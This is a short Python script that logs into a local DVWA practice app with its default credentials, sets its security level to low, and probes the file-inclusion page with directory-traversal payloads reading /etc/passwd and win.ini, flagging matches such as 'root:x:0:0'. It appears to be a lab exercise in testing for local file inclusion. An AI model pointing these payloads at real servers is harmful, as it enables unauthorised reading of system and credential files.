import requests
from bs4 import BeautifulSoup

# Links to DVWA
login_url = f"http://localhost/login.php"
lfi_url = f"http://localhost/vulnerabilities/fi/?page="
security_url = f"http://localhost/security.php"

user = "admin"
password = "password"

payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

indicators = [
    "root:x:0:0",         
    "[extensions]",       
    "[fonts]",             
    "boot loader",         
]

def get_token(html):
    #Obtaining token from site
    soup = BeautifulSoup(html, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})
    return token['value'] if token else None

def login(session):
    #Creating session and obtaining its token
    resp = session.get(login_url)
    token = get_token(resp.text)
    
    #Data required for logging
    login_data = {
        "username": user,
        "password": password,
        "Login": "Login",
        "user_token": token
    }

    #Trying to login
    r = session.post(login_url, data=login_data)
    if "Welcome" not in r.text:
        print("[!] Login didnt succed.")
        return False

    # Setting security of DVWA to low, required to work with directory traversal
    security_token = get_token(session.get(security_url).text)
    session.post(security_url, data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": security_token
    })

    print("[*] Logged in and set security level to 'low'")
    return True

def test_lfi(session):
    #Testing for directory traversal
    for payload in payloads:
        #Combining url and our payload
        url = lfi_url + payload
        print(f"\nTesting payload: {payload}")
        resp = session.get(url)
        
        #Testing payloads for different indicators
        for indicator in indicators:
            if indicator in resp.text:
                print(f"{indicator}: [!] LFI/Traversal vunrability detected!")
            else:
                print(f"{indicator}: [*] Safe or no access.")

#Function combining all we need
def main():
    #Creating session
    session = requests.Session()
    session.headers.update({"User-Agent": "LFI-TestBot"})

    #If we could login, test for Firectory Traversal
    if login(session):
        test_lfi(session)

main()